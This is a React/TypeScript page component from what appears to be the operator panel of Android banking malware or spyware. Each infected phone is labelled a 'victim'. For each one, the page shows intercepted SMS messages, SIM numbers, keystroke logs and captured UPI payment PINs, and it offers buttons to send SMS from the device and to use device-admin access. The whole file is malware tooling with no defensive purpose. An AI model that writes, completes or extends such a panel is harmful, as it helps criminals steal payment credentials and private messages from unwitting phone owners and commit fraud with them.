import { useParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { ArrowLeft, Smartphone, MessageSquare, Phone, Keyboard, CreditCard, Shield, RefreshCw, Send } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { useDB } from '@/hooks/useDB';
import { getRelativeTime } from '@/utils/time';
import { SendSMSDialog } from '@/components/SendSMSDialog';

export function DeviceDetailPage() {
  const { victimId } = useParams<{ victimId: string }>();
  const navigate = useNavigate();
  const { db, loading, error } = useDB();
  
  // State for Send SMS dialog and active tab
  const [smsDialogOpen, setSmsDialogOpen] = useState(false);
  const [activeTab, setActiveTab] = useState('overview');

  // Debug logging
  console.log('DeviceDetailPage render:', { victimId, loading, error, db });

  // Early return if no victimId
  if (!victimId) {
    console.log('No victimId, navigating to devices');
    navigate('/devices');
    return null;
  }

  // Show loading state
  if (loading) {
    console.log('Loading state, showing spinner');
    return (
      <div className="flex min-h-screen bg-background items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">Loading device details...</p>
        </div>
      </div>
    );
  }

  // Show error state
  if (error) {
    console.log('Error state:', error);
    return (
      <div className="text-center py-12">
        <h2 className="text-2xl font-bold mb-4 text-red-600">Error Loading Device</h2>
        <p className="text-muted-foreground mb-4">{error}</p>
        <Button onClick={() => navigate('/devices')}>
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to Devices
        </Button>
      </div>
    );
  }

  // Check if device exists
  const device = db?.DeviceInfo?.[victimId];
  if (!device) {
    console.log('Device not found:', victimId, 'Available devices:', Object.keys(db?.DeviceInfo || {}));
    return (
      <div className="text-center py-12">
        <h2 className="text-2xl font-bold mb-4">Device Not Found</h2>
        <p className="text-muted-foreground mb-2">Device ID: {victimId}</p>
        <p className="text-muted-foreground mb-4">Available devices: {Object.keys(db?.DeviceInfo || {}).length}</p>
        <p className="text-muted-foreground mb-4">DB state: {JSON.stringify(db, null, 2)}</p>
        <Button onClick={() => navigate('/devices')}>
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to Devices
        </Button>
      </div>
    );
  }

  console.log('Rendering device details for:', device);

  // Fallback render to prevent black screen
  if (!device || !db) {
    return (
      <div className="flex min-h-screen bg-background items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-4">Loading Device...</h2>
          <p className="text-muted-foreground">Please wait while we load the device details.</p>
        </div>
      </div>
    );
  }

  const handleSendSMS = () => {
    setSmsDialogOpen(true);
  };

  const closeSMSDialog = () => {
    setSmsDialogOpen(false);
  };

  const handleTabChange = (value: string) => {
    setActiveTab(value);
  };

  // Get data for tabs
  const messages = Object.values(db.Messages || {})
    .filter(msg => msg.VictimId === victimId)
    .sort((a, b) => new Date(b.Time).getTime() - new Date(a.Time).getTime());
  const sims = db.Sims?.[victimId] || [];
  const keyLogs = db.KeyLogs?.[victimId] || [];
  const upiPins = db.UPIPins?.[victimId] || [];

  return (
    <>
      <div className="flex min-h-screen bg-background">
        {/* Device Details */}
        <div className="flex-1 p-6 overflow-y-auto">
          {/* Header */}
          <div className="mb-6">
            <div className="flex items-center gap-3 mb-2">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => navigate('/devices')}
                className="hover:bg-muted"
              >
                <ArrowLeft className="w-4 h-4" />
              </Button>
              <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
                <Smartphone className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-bold">{victimId}</h1>
                <p className="text-muted-foreground">{device.Model || 'Unknown Model'}</p>
              </div>
            </div>
          </div>

          {/* Tabs */}
          <Tabs value={activeTab} onValueChange={handleTabChange} className="w-full">
            <TabsList className="grid w-full grid-cols-5 bg-muted/50 mb-6">
              <TabsTrigger value="overview" className="flex items-center gap-2">
                <Smartphone className="w-4 h-4" />
                Overview
              </TabsTrigger>
              <TabsTrigger value="messages" className="flex items-center gap-2">
                <MessageSquare className="w-4 h-4" />
                Messages
              </TabsTrigger>
              <TabsTrigger value="sims" className="flex items-center gap-2">
                <Phone className="w-4 h-4" />
                Sims
              </TabsTrigger>
              <TabsTrigger value="keylogs" className="flex items-center gap-2">
                <Keyboard className="w-4 h-4" />
                Key logs
              </TabsTrigger>
              <TabsTrigger value="upipins" className="flex items-center gap-2">
                <CreditCard className="w-4 h-4" />
                UPI pins
              </TabsTrigger>
            </TabsList>

            {/* Action Buttons */}
            <div className="flex justify-end gap-3 mb-6">
              <Button
                variant="outline"
                className="flex items-center gap-2 bg-blue-50 hover:bg-blue-100 border-blue-200 text-blue-700"
              >
                <Shield className="w-4 h-4" />
                Device Admin Access
              </Button>
              <Button
                variant="outline"
                className="flex items-center gap-2 bg-blue-50 hover:bg-blue-100 border-blue-200 text-blue-700"
              >
                <RefreshCw className="w-4 h-4" />
                Re Sync Device
              </Button>
              <Button
                onClick={handleSendSMS}
                disabled={device.Status !== 'Online'}
                className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white"
              >
                <Send className="w-4 h-4" />
                Send SMS
              </Button>
            </div>

            <TabsContent value="overview">
              <Card className="card-glass border-0">
                <CardContent className="p-8">
                  <div className="space-y-6">
                    {/* Device Information */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="space-y-4">
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">Device:</span>
                          <span className="font-mono">{victimId}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">Status:</span>
                          <Badge className={device.Status === 'Online' ? 'badge-online' : 'badge-offline'}>
                            {device.Status || 'Unknown'}
                          </Badge>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">IP Address:</span>
                          <span className="font-mono">{device.IPAddress || 'Unknown'}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">UPI Pin:</span>
                          <code className="bg-muted px-2 py-1 rounded text-sm">{device.UPIPin || 'Unknown'}</code>
                        </div>
                      </div>
                      <div className="space-y-4">
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">Note:</span>
                          <span>{device.Note || '-'}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">Added:</span>
                          <span>{device.Added || '-'}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">Apps Installed:</span>
                          <Badge variant="outline">{device.AppsInstalled || 0}</Badge>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">Battery:</span>
                          <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
                            {device.Battery || 'Unknown'}
                          </Badge>
                        </div>
                      </div>
                    </div>

                    {/* Device Brand, Model, and Android Version */}
                    <div className="border-t pt-6">
                      <h3 className="text-lg font-semibold mb-4">Device Specifications</h3>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">Brand:</span>
                            <Badge variant="outline">{device.Brand || 'Unknown'}</Badge>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">Model:</span>
                            <span className="font-mono">{device.Model || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">Android Version:</span>
                            <Badge variant="outline">{device.AndroidVersion || 'Unknown'}</Badge>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="messages">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <MessageSquare className="w-5 h-5" />
                    Messages ({messages.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {messages.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No messages found</p>
                  ) : (
                    <div className="space-y-4 max-h-96 overflow-y-auto">
                      {messages.map((msg, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                          <div className="flex items-start justify-between gap-3 mb-2">
                            <span className="font-medium text-sm">{msg.Sender}</span>
                            <div className="flex items-center gap-2">
                              <Badge variant="outline" className="text-xs">{msg.SmsType}</Badge>
                              <span className="text-xs text-muted-foreground">{getRelativeTime(msg.Time)}</span>
                            </div>
                          </div>
                          <p className="text-sm text-muted-foreground">{msg.Body}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="sims">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Phone className="w-5 h-5" />
                    SIM Cards ({sims.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {/* Device SIM Numbers */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">Device SIM Numbers</h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">SIM 1:</span>
                            <span className="font-mono">{device.SimNumber1 || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">SIM 2:</span>
                            <span className="font-mono">{device.SimNumber2 || 'Unknown'}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Device Service Names */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">Device Service Names</h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">Service 1:</span>
                            <span>{device.ServiceName1 || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">Service 2:</span>
                            <span>{device.ServiceName2 || 'Unknown'}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* SIM Cards from Database */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">SIM Cards from Database</h3>
                      {sims.length === 0 ? (
                        <p className="text-muted-foreground text-center py-8">No SIM cards found in database</p>
                      ) : (
                        <div className="space-y-3">
                          {sims.map((sim, idx) => (
                            <div key={idx} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg">
                              <div>
                                <span className="font-medium">Slot {sim.slot}</span>
                                <p className="text-sm text-muted-foreground">{sim.carrier || 'No carrier'}</p>
                              </div>
                              <code className="text-sm font-mono">{sim.number || 'No number'}</code>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="keylogs">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Keyboard className="w-5 h-5" />
                    Key Logs ({keyLogs.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {keyLogs.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No key logs found</p>
                  ) : (
                    <div className="space-y-3 max-h-96 overflow-y-auto">
                      {keyLogs.map((log, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border font-mono">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-xs text-muted-foreground">{getRelativeTime(log.time)}</span>
                          </div>
                          <code className="text-sm">{log.text}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="upipins">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <CreditCard className="w-5 h-5" />
                    UPI Pins ({upiPins.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {upiPins.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No UPI pins found</p>
                  ) : (
                    <div className="space-y-2">
                      {upiPins.map((pin, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg">
                          <code className="text-sm font-mono">{pin}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
      <SendSMSDialog 
        isOpen={smsDialogOpen} 
        onClose={closeSMSDialog} 
        device={device}
        deviceId={victimId} 
      />
    </>
  );
}

export default DeviceDetailPage;